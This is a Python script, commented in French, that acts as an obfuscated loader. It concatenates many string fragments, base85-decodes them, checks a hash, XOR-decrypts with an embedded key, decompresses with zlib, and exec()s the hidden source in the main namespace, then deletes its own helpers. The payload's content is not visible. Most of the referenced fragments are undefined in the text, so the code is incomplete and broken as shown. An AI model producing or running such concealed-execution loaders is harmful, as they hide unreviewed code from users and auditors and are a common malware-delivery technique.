_chkLahhy0Np4vY = 'b6%z{a?wB(o_juN$EMZ?Qy6fhr`Rs^E&=+G$80yAA=N`WYm!lzaO0tCj<1*#8vXr<{6+F$8}'
_cskF2l5iju1n1n = '-RHz#9}r|=2T=JCl=id${LjuLQ@PUE!He<+HDhbQ|6M&pFi4M8x#roPFu`=tK#-!~YL<dVTO'
_cpQsiyjhDuQjY9 = 'B_+(mUWN!^'

_ptOlbqSITVosGw = __import__('base64').b85decode(_cgWrrA_fcfOQEc + _czWJdAZAEAbF2Y + _cyrQIy76wpqRw0 + _ceNsVwienfP6PI + _ca3rIHH0VCcisk + _cmgLTFimkOihx0 + _cyse0Ck3ITmyPs + _ccQn5NHK_O0bjd + _cbQaI6wNlHQsyA + _cfxkAPNCYiblAW + _cpMF2VWKHQ9SIF + _ckvdc5jl8ff5bE + _ca8EtIAo2tFwkI + _cyx5dMoCJVJJn2 + _caGv860ZLpjh3j + _ccLKh22G12yzxq + _cuVrFkCT9mr1mW + _ch0Ji2g21uzvYP + _chn2myeYQKPS_4 + _clBwx_K036Jp93 + _ciYUQFrLWCikoy + _cwbS8Lwhyuy4BA + _cbmgSZtF_Xpr7B + _cj9l6kXmMC6Ja4 + _czcnGhD7gBzenz + _cdmevv6GoQps1g + _ci8LkkjEqSSsZh + _csK5BnHZJiRT_7 + _cm4RPS6FBGXSMH + _czuuJOqPV0VFa1 + _cx0X_XAtMh7OFY + _cum9cdqmGdylXY + _crN1EO5gopzo6h + _ct4Gv7JtZ5ChID + _ccHHgdE9AF4IS6 + _cuH60UluOy3r8c + _chFk1m2Z7HPHvX + _cjLZ8Ooid9FkUY + _cgFw7GXd3doSTq + _chM1WYpaU5dUne + _cnSiz5dFh3Ncwb + _cxuseEJRrNan6i + _cwBo7J9JiP0UUp + _ccQni8ZYaE5XgC + _cgurwx5xyY3HST + _cvefiZzYtBdupS + _cz8excWJ8DFjTn + _ckDRO5txLVBWAQ + _cnwqbbP38U2BiW + _cr_q7Y2VtaB7pg + _cgCLKqify0hKcD + _chI_excVQNcy0b + _cxCapypJ_Wfxxw + _cqm6UkOUHl6q7I + _cqeFwcUMT1gLSb + _czYmcAbh3hbEdm + _ciKVcAwEdWREa4 + _cjEmiyz2hT7vLV + _cf1HNSAcSFOq_t + _cxGhI7QeQQniCC + _cdEQBI9wzXY4xp + _crlAGn6R2wrEuZ + _cluuJ0R2e3KCYU + _cfP4plcR5hg_d5 + _chjI1o7Z5Akute + _cpVzqW020eHY1P + _cji7YC52Rj89my + _cyzYPDy4HZY9Lt + _cmiqTIR841mSQh + _cmVMzpFpMxmCVl + _cibE1SzThwzzAG + _cmGjp9MuZxgncg + _cuyOvrvkKaofHa + _corV3VS14vTNkt + _cnUjD4fyOMTUJI + _crAgR7G6mX0Iwo + _cwk4K00YalhRGh + _cc8FpVGQHkkQJf + _cyY_CuoBtzDxko + _cgrFezX1Vr0fOH + _cdM5KKkfTyqpzn + _czVyQNnXP1ZCHa + _cwPkcp2MDjLU3r + _cpYZefg2W4U1tM + _cteNaPj7CR40cp + _cpN5_rCm690917 + _cy2W4Q73MhmtAw + _cl1elXtmb3xgYv + _cnO1W9L13tTf2Q + _cnluMDAzEzuRPO + _cw96N808QUBvWD + _ccl3FcPRSgQnc0 + _cbvxT3RkYtIUDg + _c_rNOokFS5O909 + _czpSLLNsMtEzod + _cbgUBXaSgmD09q + _cwA2NvMKGdYg4O + _cjd_3cT6ZhDq0R + _ciZhbLbGsX_Zgm + _cm0c6qK36cCdQW + _cs5s1Ikixy5LvA + _cv8P5xgrWMCDiU + _ccT626N45N10GE + _criMl3rivSBkbP + _cj8eGhdF8n3ZmB + _caVXSDs7uWh0PO + _cjV8Q_3gLL1NV3 + _czc18j7xXBkz0r + _chW3z55KyHbl_N + _cvl3cR2NdqPv4c + _cbVDHiJZNiccYN + _ccDFL_Fxb_E5FD + _ccaigUeW6w5rF9 + _ctVeiJ92wmectP + _ciE7H7qJi7yOm9 + _cbaGp2RG1C8ba4 + _cp8VnuNrYCUrVK + _cqoN3NtrzcRLlR + _cev3ncJKb4wctK + _cznMWjbSZiEGCg + _cqKQZtwU3e_4WS + _cbAZiCTgw_Z_FU + _c_joE4vbGApncw + _cqe25MKsY2YI5u + _cqscCa7yZ72hZ8 + _cb72gXvtUy8VB3 + _crzhl7sPMmrnhU + _ccJ96i7UzuWmvd + _coUCmUVlMf1BiU + _cqFObOjhQQEc59 + _co2sxdzU5vh7ja + _cjQOK9EBFlAXCY + _cp5AZtucowsYO8 + _cmYQUWrv34ixI2 + _caNzpkC9ZrOYnO + _cjRpekkDKS8mY0 + _c_XGsZ4FR2txWv + _czp5l16C2KM56w + _cpNWZnGLhFPUvW + _cuYDQZVe_l6Xj_ + _cgMhfYTueiH5yg + _cvkbUSeK3DQk9c + _cicIrwZCuZwLxy + _cg3AzPc_Y9bjWY + _ceXcKjUOnlWDZq + _cljhridZzCc1sd + _cljDM55ZzfAt93 + _cnizArFp_2aLI0 + _cfmrCbaXFNTauT + _cl1yUKWULpij2X + _cmYHnYNUf7k33X + _cjmP9tuEm6sPxM + _crvYoq4isOgekt + _cfWpci3f5jUaKc + _crSLIOcJAzOtUe + _cnWgxRHU8gwzf9 + _csgQjMSQB3jQ_h + _cdyY8q5QbIGCAj + _chkLahhy0Np4vY + _cskF2l5iju1n1n + _cpQsiyjhDuQjY9)
if __import__('hashlib').sha256(_ptOlbqSITVosGw).hexdigest() != '401d4b2276318685d9f9071dec4a051f287eea3d8c29e2c4baf56ad504cc63d2':
    __import__('sys').exit(1)
_xbDCMPZ_XpT4sa = bytes([153, 35, 54, 60, 126, 180, 138, 249, 176, 244, 199, 46, 224, 110, 219, 43])
_fktYKeNrBSr1CQ9 = bytes([53, 112, 140, 131, 47, 23, 161, 141, 56, 211, 88, 148, 25, 35, 173, 91])

def _fxozmTRDqrhDnNJ(_byd1l7VijU5T9n, _ku6mZC1Vu28fGj):
    return bytes(_byd1l7VijU5T9n[_ii4OsQGlbTYQU8] ^ _ku6mZC1Vu28fGj[_ii4OsQGlbTYQU8 % len(_ku6mZC1Vu28fGj)] for _ii4OsQGlbTYQU8 in range(len(_byd1l7VijU5T9n)))

def _fdt1torq6zBboed(_t_Zsb3xt_95F45):
    import zlib
    return zlib.decompress(_t_Zsb3xt_95F45) # Un seul niveau de zlib ici pour simplifier

def _fevgzT1J4z8oseg():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xvmga8QBe7d8kt = _fxozmTRDqrhDnNJ(_ptOlbqSITVosGw, _xbDCMPZ_XpT4sa)
    # 2. Décompression Zlib
    _djXzzXFwydTVQl = _fdt1torq6zBboed(_xvmga8QBe7d8kt)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _djXzzXFwydTVQl.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nq7XlUfqsqk76Y = _main.__dict__
    _nq7XlUfqsqk76Y.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nq7XlUfqsqk76Y)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fevgzT1J4z8oseg()
try:
    del _fxozmTRDqrhDnNJ, _fdt1torq6zBboed, _fevgzT1J4z8oseg
    del _ptOlbqSITVosGw, _xbDCMPZ_XpT4sa, _fktYKeNrBSr1CQ9
except:
    pass
